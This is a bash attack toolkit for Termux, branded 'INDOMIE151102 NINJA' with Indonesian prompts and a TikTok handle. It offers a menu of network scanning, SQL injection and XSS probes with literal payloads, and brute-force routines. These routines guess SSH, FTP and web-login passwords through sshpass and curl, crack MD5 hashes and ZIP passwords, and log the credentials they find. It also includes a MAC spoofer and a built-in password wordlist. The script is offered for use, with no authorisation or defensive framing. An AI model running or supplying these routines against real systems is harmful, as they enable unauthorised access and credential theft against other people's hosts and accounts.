#!/data/data/com.termux/files/usr/bin/bash
# ============================================
# INDOMIE151102 NINJA v3.0 - NON-ROOT EDITION
# 23 FITUR LENGKAP - BRUTE FORCE RANDOM GENERATOR
# Special Edition untuk indomie151102
# Copyright © RianModss
# ============================================

# Warna
GREEN='\033[0;32m'; RED='\033[0;31m'; YELLOW='\033[1;33m'
BLUE='\033[0;34m'; PURPLE='\033[0;35m'; CYAN='\033[0;36m'
WHITE='\033[1;37m'; NC='\033[0m'

clear
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
figlet -f slant "indomie151102" | lolcat
echo -e "${YELLOW}        TikTok:@indomie151102${NC}"
echo -e "${GREEN}        NO ROOT NEEDED${NC}"
echo -e "${CYAN}══════════════════════════════════════════════${NC}"
echo ""

# ========== FUNGSI BANTU ==========
banner() { echo -e "\n${PURPLE}══ $1 ══${NC}\n"; }
progress() { echo -e "${BLUE}[•] $1${NC}"; }
sukses() { echo -e "${GREEN}[✓] $1${NC}"; }
gagal() { echo -e "${RED}[✗] $1${NC}"; }
stop_notice() { echo -e "${YELLOW}[!] Tekan Ctrl+C untuk berhenti${NC}"; }

# ========== FITUR SCANNING (TETAP SAMA) ==========
scan_host() {
    banner "LIVE HOST SCANNER"
    read -p "Network (contoh: 192.168.1.0/24): " net
    progress "Scanning..."
    nmap --unprivileged -sn $net | grep "Nmap scan" | awk '{print $5}' > host_$$.txt
    sukses "$(wc -l < host_$$.txt) host ditemukan"
    cat host_$$.txt
}

scan_port_cepat() {
    banner "PORT SCANNER CEPAT"
    read -p "IP target: " ip
    progress "Scan port 1-1000..."
    nmap --unprivileged -sS -p1-1000 $ip | grep -E "^[0-9]"
}

scan_port_semua() {
    banner "DEEP PORT SCAN"
    read -p "IP target: " ip
    progress "Ini butuh waktu 3-5 menit..."
    nmap --unprivileged -p- $ip > port_$$.txt
    sukses "Hasil di port_$$.txt"
}

scan_service() {
    banner "SERVICE DETECTION"
    read -p "IP target: " ip
    read -p "Port (kosongin semua): " port
    [ -z "$port" ] && nmap --unprivileged -sV $ip || nmap --unprivileged -sV -p $port $ip
}

scan_os() {
    banner "OS FINGERPRINTING"
    read -p "IP target: " ip
    nmap --unprivileged -O $ip | grep -E "OS:|Aggressive"
}

# ========== FITUR WEB (TETAP SAMA) ==========
scan_sql() {
    banner "SQL INJECTION SCANNER"
    read -p "URL (contoh: http://site.com/page.php?id=1): " url
    progress "Testing basic payload..."
    payload="' OR '1'='1"
    res=$(curl -s -G --data-urlencode "id=$payload" "$url")
    if echo "$res" | grep -qi "sql\|mysql\|error\|warning"; then
        sukses "Potensi SQL injection ditemukan!"
    else
        gagal "Tidak terdeteksi SQL injection"
    fi
}

scan_dir() {
    banner "DIRECTORY BRUTE FORCE"
    read -p "URL (contoh: http://site.com): " url
    progress "Mencoba direktori umum..."
    for d in admin login wp-admin backup css js images uploads; do
        status=$(curl -s -o /dev/null -w "%{http_code}" "$url/$d/")
        [ "$status" = "200" -o "$status" = "301" ] && sukses "$url/$d/ ($status)"
    done
}

scan_xss() {
    banner "XSS TESTER"
    read -p "URL: " url
    read -p "Parameter: " param
    payload="<script>alert(1)</script>"
    res=$(curl -s -G --data-urlencode "$param=$payload" "$url")
    echo "$res" | grep -q "$payload" && sukses "Potensi XSS!" || gagal "Aman dari XSS"
}

scan_wp() {
    banner "WORDPRESS SCANNER"
    read -p "URL WordPress: " url
    curl -s "$url/wp-links-opml.php" | grep generator
    curl -s -I "$url/wp-admin" | head -1
}

scan_ssl() {
    banner "SSL CHECKER"
    read -p "Domain: " domain
    echo | openssl s_client -connect $domain:443 2>/dev/null | openssl x509 -text | grep -E "Issuer:|Not Before|Not After"
}

# ========== FITUR BRUTE FORCE RANDOM GENERATOR ==========

# Fungsi baca wordlist (tetap dipertahankan)
baca_wordlist() {
    if [ -f "$1" ]; then
        cat "$1"
    else
        # Wordlist bawaan
        echo -e "admin\nroot\ntest\nuser\npassword\n123456\n12345678\nqwerty\nadmin123\npassword123\nletmein\nwelcome\nmonkey\nsunshine\nmaster\nhello\nfreedom\nwhatever\nqazwsx\ntrustno1"
    fi
}

# BRUTE SSH DENGAN RANDOM GENERATOR
brute_ssh() {
    banner "SSH BRUTE FORCE - RANDOM GENERATOR"
    echo -e "${YELLOW}CREATED BY: indomie151102 🇮🇩${NC}"
    stop_notice
    
    read -p "IP target: " ip
    read -p "Username: " user
    
    echo -e "${YELLOW}Pilih mode:${NC}"
    echo "1. Angka (1-9999)"
    echo "2. Huruf (a-z loop tak terbatas)"
    echo "3. Kombinasi angka + huruf"
    read -p "Pilih (1-3): " mode
    
    case $mode in
        1) brute_ssh_angka "$ip" "$user" ;;
        2) brute_ssh_huruf "$ip" "$user" ;;
        3) brute_ssh_kombinasi "$ip" "$user" ;;
        *) gagal "Pilihan gak ada!" ;;
    esac
}

brute_ssh_angka() {
    local ip="$1"; local user="$2"
    echo -e "${YELLOW}[•] Mode: ANGKA 1-9999${NC}"
    
    for i in $(seq 1 9999); do
        echo -ne "${CYAN}Mencoba password: $i${NC}\r"
        sshpass -p "$i" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $user@$ip exit 2>/dev/null
        if [ $? -eq 0 ]; then
            echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$i${NC}"
            echo "$user:$i" >> ssh_found.txt
            return
        fi
    done
    echo -e "\n${RED}❌ Password tidak ditemukan dalam range 1-9999${NC}"
}

brute_ssh_huruf() {
    local ip="$1"; local user="$2"
    echo -e "${YELLOW}[•] Mode: HURUF a-z (loop tak terbatas)${NC}"
    echo -e "${RED}Tekan Ctrl+C untuk berhenti${NC}"
    
    trap 'echo -e "\n${YELLOW}Stopped by user${NC}"; return' INT
    
    while true; do
        for c in {a..z}; do
            echo -ne "${CYAN}Mencoba password: $c${NC}\r"
            sshpass -p "$c" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $user@$ip exit 2>/dev/null
            [ $? -eq 0 ] && { echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$c${NC}"; echo "$user:$c" >> ssh_found.txt; return; }
        done
    done
}

brute_ssh_kombinasi() {
    local ip="$1"; local user="$2"
    echo -e "${YELLOW}[•] Mode: KOMBINASI (1-99 + a-z)${NC}"
    
    for num in $(seq 1 99); do
        for huruf in {a..z}; do
            pass="${num}${huruf}"
            echo -ne "${CYAN}Mencoba password: $pass${NC}\r"
            sshpass -p "$pass" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 $user@$ip exit 2>/dev/null
            if [ $? -eq 0 ]; then
                echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$pass${NC}"
                echo "$user:$pass" >> ssh_found.txt
                return
            fi
        done
    done
    echo -e "\n${RED}❌ Password tidak ditemukan dalam kombinasi${NC}"
}

# BRUTE FTP DENGAN RANDOM GENERATOR
brute_ftp() {
    banner "FTP BRUTE FORCE - RANDOM GENERATOR"
    echo -e "${YELLOW}CREATED BY: indomie151102 🇮🇩${NC}"
    stop_notice
    
    read -p "IP target: " ip
    read -p "Username: " user
    
    echo -e "${YELLOW}Pilih mode:${NC}"
    echo "1. Angka (1-9999)"
    echo "2. Huruf (a-z loop tak terbatas)"
    echo "3. Kombinasi angka + huruf"
    read -p "Pilih (1-3): " mode
    
    case $mode in
        1) brute_ftp_angka "$ip" "$user" ;;
        2) brute_ftp_huruf "$ip" "$user" ;;
        3) brute_ftp_kombinasi "$ip" "$user" ;;
        *) gagal "Pilihan gak ada!" ;;
    esac
}

brute_ftp_angka() {
    local ip="$1"; local user="$2"
    for i in $(seq 1 9999); do
        echo -ne "${CYAN}Mencoba password: $i${NC}\r"
        curl -s -u "$user:$i" "ftp://$ip/" >/dev/null 2>&1
        [ $? -eq 0 ] && { echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$i${NC}"; echo "$user:$i" >> ftp_found.txt; return; }
    done
    echo -e "\n${RED}❌ Password tidak ditemukan${NC}"
}

brute_ftp_huruf() {
    local ip="$1"; local user="$2"
    trap 'echo -e "\n${YELLOW}Stopped by user${NC}"; return' INT
    while true; do
        for c in {a..z}; do
            echo -ne "${CYAN}Mencoba password: $c${NC}\r"
            curl -s -u "$user:$c" "ftp://$ip/" >/dev/null 2>&1
            [ $? -eq 0 ] && { echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$c${NC}"; echo "$user:$c" >> ftp_found.txt; return; }
        done
    done
}

brute_ftp_kombinasi() {
    local ip="$1"; local user="$2"
    for num in $(seq 1 99); do
        for huruf in {a..z}; do
            pass="${num}${huruf}"
            echo -ne "${CYAN}Mencoba password: $pass${NC}\r"
            curl -s -u "$user:$pass" "ftp://$ip/" >/dev/null 2>&1
            [ $? -eq 0 ] && { echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $user:$pass${NC}"; echo "$user:$pass" >> ftp_found.txt; return; }
        done
    done
}

# BRUTE WEB FORM DENGAN RANDOM GENERATOR
brute_web() {
    banner "WEB FORM BRUTE FORCE - RANDOM GENERATOR"
    echo -e "${YELLOW}CREATED BY: indomie151102 🇮🇩${NC}"
    stop_notice
    
    read -p "URL login: " url
    read -p "Username: " user
    read -p "Field username: " ufield
    read -p "Field password: " pfield
    read -p "String error: " err
    
    echo -e "${YELLOW}Pilih mode:${NC}"
    echo "1. Angka (1-9999)"
    echo "2. Huruf (a-z loop tak terbatas)"
    echo "3. Kombinasi angka + huruf"
    read -p "Pilih (1-3): " mode
    
    case $mode in
        1) brute_web_angka "$url" "$user" "$ufield" "$pfield" "$err" ;;
        2) brute_web_huruf "$url" "$user" "$ufield" "$pfield" "$err" ;;
        3) brute_web_kombinasi "$url" "$user" "$ufield" "$pfield" "$err" ;;
        *) gagal "Pilihan gak ada!" ;;
    esac
}

brute_web_angka() {
    local url="$1"; local user="$2"; local ufield="$3"; local pfield="$4"; local err="$5"
    for i in $(seq 1 9999); do
        echo -ne "${CYAN}Mencoba password: $i${NC}\r"
        res=$(curl -s -X POST -d "$ufield=$user&$pfield=$i" "$url")
        echo "$res" | grep -q "$err" || { echo -e "\n${GREEN}✅ MUNGKIN BERHASIL! Password: $i${NC}"; echo "$user:$i" >> web_found.txt; return; }
    done
}

brute_web_huruf() {
    local url="$1"; local user="$2"; local ufield="$3"; local pfield="$4"; local err="$5"
    trap 'echo -e "\n${YELLOW}Stopped by user${NC}"; return' INT
    while true; do
        for c in {a..z}; do
            echo -ne "${CYAN}Mencoba password: $c${NC}\r"
            res=$(curl -s -X POST -d "$ufield=$user&$pfield=$c" "$url")
            echo "$res" | grep -q "$err" || { echo -e "\n${GREEN}✅ MUNGKIN BERHASIL! Password: $c${NC}"; echo "$user:$c" >> web_found.txt; return; }
        done
    done
}

brute_web_kombinasi() {
    local url="$1"; local user="$2"; local ufield="$3"; local pfield="$4"; local err="$5"
    for num in $(seq 1 99); do
        for huruf in {a..z}; do
            pass="${num}${huruf}"
            echo -ne "${CYAN}Mencoba password: $pass${NC}\r"
            res=$(curl -s -X POST -d "$ufield=$user&$pfield=$pass" "$url")
            echo "$res" | grep -q "$err" || { echo -e "\n${GREEN}✅ MUNGKIN BERHASIL! Password: $pass${NC}"; echo "$user:$pass" >> web_found.txt; return; }
        done
    done
}

# HASH CRACKER DENGAN RANDOM GENERATOR
brute_hash() {
    banner "HASH CRACKER - RANDOM GENERATOR"
    echo -e "${YELLOW}CREATED BY: indomie151102 🇮🇩${NC}"
    stop_notice
    
    read -p "Masukkan hash MD5: " hash
    
    echo -e "${YELLOW}Pilih mode:${NC}"
    echo "1. Angka (1-9999)"
    echo "2. Huruf (a-z loop tak terbatas)"
    echo "3. Kombinasi angka + huruf"
    read -p "Pilih (1-3): " mode
    
    case $mode in
        1) crack_hash_angka "$hash" ;;
        2) crack_hash_huruf "$hash" ;;
        3) crack_hash_kombinasi "$hash" ;;
        *) gagal "Pilihan gak ada!" ;;
    esac
}

crack_hash_angka() {
    local hash="$1"
    for i in $(seq 1 9999); do
        echo -ne "${CYAN}Mencoba: $i${NC}\r"
        wordmd5=$(echo -n "$i" | md5sum | awk '{print $1}')
        [ "$wordmd5" = "$hash" ] && { echo -e "\n${GREEN}✅ FOUND! Password: $i${NC}"; echo "$i" >> hash_found.txt; return; }
    done
    echo -e "\n${RED}❌ Tidak ditemukan${NC}"
}

crack_hash_huruf() {
    local hash="$1"
    trap 'echo -e "\n${YELLOW}Stopped by user${NC}"; return' INT
    while true; do
        for c in {a..z}; do
            echo -ne "${CYAN}Mencoba: $c${NC}\r"
            wordmd5=$(echo -n "$c" | md5sum | awk '{print $1}')
            [ "$wordmd5" = "$hash" ] && { echo -e "\n${GREEN}✅ FOUND! Password: $c${NC}"; echo "$c" >> hash_found.txt; return; }
        done
    done
}

crack_hash_kombinasi() {
    local hash="$1"
    for num in $(seq 1 99); do
        for huruf in {a..z}; do
            pass="${num}${huruf}"
            echo -ne "${CYAN}Mencoba: $pass${NC}\r"
            wordmd5=$(echo -n "$pass" | md5sum | awk '{print $1}')
            [ "$wordmd5" = "$hash" ] && { echo -e "\n${GREEN}✅ FOUND! Password: $pass${NC}"; echo "$pass" >> hash_found.txt; return; }
        done
    done
}

# ZIP CRACKER DENGAN RANDOM GENERATOR (YANG DIREQUEST)
brute_zip() {
    banner "ZIP PASSWORD CRACKER - RANDOM GENERATOR"
    echo -e "${YELLOW}CREATED BY: indomie151102 🇮🇩${NC}"
    stop_notice
    
    read -p "Path file zip: " zipf
    [ ! -f "$zipf" ] && gagal "File gak ada!" && return
    
    echo -e "${YELLOW}Pilih mode:${NC}"
    echo "1. Angka (1-9999)"
    echo "2. Huruf (a-z loop tak terbatas)"
    echo "3. Kombinasi angka + huruf"
    read -p "Pilih (1-3): " mode
    
    case $mode in
        1) crack_zip_angka "$zipf" ;;
        2) crack_zip_huruf "$zipf" ;;
        3) crack_zip_kombinasi "$zipf" ;;
        *) gagal "Pilihan gak ada!" ;;
    esac
}

crack_zip_angka() {
    local zipf="$1"
    echo -e "${YELLOW}[•] Mode: ANGKA 1-9999${NC}"
    
    for i in $(seq 1 9999); do
        echo -ne "${CYAN}Percobaan ke-$i/9999${NC}\r"
        unzip -P "$i" -t "$zipf" > /dev/null 2>&1
        if [ $? -eq 0 ]; then
            echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $i${NC}"
            echo "$i" > zip_password_found.txt
            return
        fi
    done
    echo -e "\n${RED}❌ Password tidak ditemukan dalam range 1-9999${NC}"
}

crack_zip_huruf() {
    local zipf="$1"
    echo -e "${YELLOW}[•] Mode: HURUF a-z (loop tak terbatas)${NC}"
    echo -e "${RED}Tekan Ctrl+C untuk berhenti${NC}"
    
    trap 'echo -e "\n${YELLOW}Stopped by user${NC}"; return' INT
    
    while true; do
        for c in {a..z}; do
            echo -ne "${CYAN}Mencoba: $c${NC}\r"
            unzip -P "$c" -t "$zipf" > /dev/null 2>&1
            if [ $? -eq 0 ]; then
                echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $c${NC}"
                echo "$c" > zip_password_found.txt
                return
            fi
        done
    done
}

crack_zip_kombinasi() {
    local zipf="$1"
    echo -e "${YELLOW}[•] Mode: KOMBINASI (1-99 + a-z)${NC}"
    
    for num in $(seq 1 99); do
        for huruf in {a..z}; do
            pass="${num}${huruf}"
            echo -ne "${CYAN}Mencoba: $pass${NC}\r"
            unzip -P "$pass" -t "$zipf" > /dev/null 2>&1
            if [ $? -eq 0 ]; then
                echo -e "\n${GREEN}✅ PASSWORD DITEMUKAN: $pass${NC}"
                echo "$pass" > zip_password_found.txt
                return
            fi
        done
    done
    echo -e "\n${RED}❌ Password tidak ditemukan dalam kombinasi${NC}"
}

# ========== FITUR INFO GATHERING (TETAP SAMA) ==========
info_dns() {
    banner "DNS ENUMERATION"
    read -p "Domain: " d
    nslookup $d
    nslookup -type=mx $d
    nslookup -type=ns $d
}

info_whois() {
    banner "WHOIS LOOKUP"
    read -p "Domain/IP: " t
    whois $t | grep -E "Domain Name:|Registrar:|Creation Date"
}

info_trace() {
    banner "TRACEROUTE"
    read -p "Domain/IP: " t
    traceroute $t
}

info_geo() {
    banner "GEOLOCATION IP"
    read -p "IP: " ip
    curl -s "http://ip-api.com/json/$ip" | grep -E '"country"|"city"|"isp"'
}

info_subdomain() {
    banner "SUBDOMAIN ENUMERATOR"
    read -p "Domain: " d
    for sub in www mail ftp admin blog dev api app; do
        host "$sub.$d" >/dev/null 2>&1 && sukses "$sub.$d"
    done
}

# ========== FITUR UTILITIES (TETAP SAMA) ==========
util_mac() {
    banner "MAC ADDRESS SPOOFER"
    iface="wlan0"
    sukses "Mengganti MAC address..."
    ip link set $iface down
    macchanger -r $iface
    ip link set $iface up
    ip link show $iface | grep ether
}

util_ping() {
    banner "PING SWEEPER"
    read -p "Network (contoh: 192.168.1): " net
    for i in {1..254}; do
        ping -c 1 -W 1 $net.$i >/dev/null 2>&1 && sukses "$net.$i LIVE" || gagal "$net.$i DOWN"
    done
}

util_report() {
    banner "GENERATE REPORT"
    echo "<html><body><h1>INDOMIE151102 REPORT</h1>" > report_$$.html
    for f in *.txt; do [ -f "$f" ] && echo "<h2>$f</h2><pre>$(cat $f)</pre>" >> report_$$.html; done
    echo "</body></html>" >> report_$$.html
    sukses "Report: report_$$.html"
}

# ========== MENU UTAMA ==========
while true; do
    echo -e "\n${CYAN}╔══════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}         INDOMIE TOOL           ${CYAN}║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${YELLOW} [1]  Live Host Scanner            [11] SSH Brute Random${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [2]  Port Scanner Cepat           [12] FTP Brute Random${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [3]  Deep Port Scan               [13] Web Form Brute Random${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [4]  Service Detection            [14] Hash Cracker Random${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [5]  OS Fingerprinting            [15] ZIP Cracker Random${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [6]  SQL Injection Scanner        [16] DNS Enumeration${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [7]  Directory Brute Force        [17] WHOIS Lookup${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [8]  XSS Tester                   [18] Traceroute${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [9]  WordPress Scanner            [19] IP Geolocation${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW} [10] SSL Checker                  [20] Subdomain Enumerator${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}                                  [21] MAC Spoofer${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}                                  [22] Ping Sweeper${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}                                  [23] Generate Report${CYAN}║${NC}"
    echo -e "${CYAN}╠══════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${RED} [0]  Keluar                                          ${CYAN}║${NC}"
    echo -e "${CYAN}╚══════════════════════════════════════════════╝${NC}"
    
    read -p "Pilih (0-23): " p
    case $p in
        1) scan_host;; 2) scan_port_cepat;; 3) scan_port_semua;; 4) scan_service;;
        5) scan_os;; 6) scan_sql;; 7) scan_dir;; 8) scan_xss;; 9) scan_wp;;
        10) scan_ssl;; 11) brute_ssh;; 12) brute_ftp;; 13) brute_web;;
        14) brute_hash;; 15) brute_zip;; 16) info_dns;; 17) info_whois;;
        18) info_trace;; 19) info_geo;; 20) info_subdomain;; 21) util_mac;;
        22) util_ping;; 23) util_report;; 0) exit 0;;
        *) gagal "Pilihan gak ada!";;
    esac
    echo -e "\n${YELLOW}Tekan Enter...${NC}"; read
done
